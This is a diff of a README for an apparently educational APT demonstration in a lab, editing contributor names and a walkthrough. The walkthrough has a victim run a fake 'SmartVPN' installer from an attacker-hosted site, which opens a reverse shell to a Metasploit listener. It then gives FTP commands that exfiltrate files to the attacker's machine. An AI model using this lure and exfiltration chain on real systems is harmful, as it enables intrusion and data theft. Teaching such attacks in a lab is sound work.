@@ -11,10 +11,10 @@ Note: This is only for educational purposes!
 
 ## Project Contributors
 
-- Pranauv Kumar
-- Rahul Aggarwal
-- Sai Swetha M
-- Anurag Yadav
+- Pranauv Kumar - S20210010186
+- Rahul Agarwal - S20210010187
+- Sai Swetha M - S20210010143
+- Anurag Yadav - S20210010026
 
 ## Some Information on APT
 
@@ -81,24 +81,23 @@ set lport 4443
 exploit
 ```
 
-Now that the listener is up and running in the Kali, we go for the Ubuntu.
+Now that the listener is up and running in the Kali, we go for Ubuntu.
 
-From here, we access the SmartVPN website that is hosted on port 8000 of 192.168.100.4 and download the vpn setup from the website and we run it!
+From here, we access the SmartVPN website that is hosted on "192.168.100.4:8000" and download the vpn setup from the website and we run it!
 
-Boom!
+Boom! Now, we have a hit in Kali Linux's Listener inside msfconsole and now we can access the victim's computer through the shell that was spawned!
 
-Now, we have a hit in the Kali Linux's Listener inside msfconsole and now we can access the victim's computer through the shell that was spawned!
+After this, to just show the data exfiltration part, we use FTP to connect to the attacker's computer from the victim's shell in the msfconsole to exfiltrate some data (some random dummy.pdf files from victim's computer)
 
-After this, to just show the data exfiltration part, we use FTP to connect from the victim's shell to the attacker's computer to exfiltrate some data (some random dummy.pdf files from victim's computer)
-to do this, type the fllg in the shell spawned in the Kali,
+To do this, type the following in the shell spawned in the Kali Linux's Msfconsole,
 
 ```bash
 shell
 bash
 ftp 192.168.100.4  #and enter kali's ftp password when prompted
 put dummy.pdf ./   #to transfer dummy.pdf from victim's to attacker's computer
-``` 
+```
 
-put command here sees the dummy.pdf in the main/default directory of ftp User in Ubuntu and transfers it to the default directory of Kali's ftp user.
+"put" command of FTP, sees the "dummy.pdf" in the main/default directory of ftp User in Ubuntu and transfers it to the default directory of Kali's ftp user.
 
-Now we are done with the whole demonstration!
+Hence, we are done with the whole demonstration of APT!
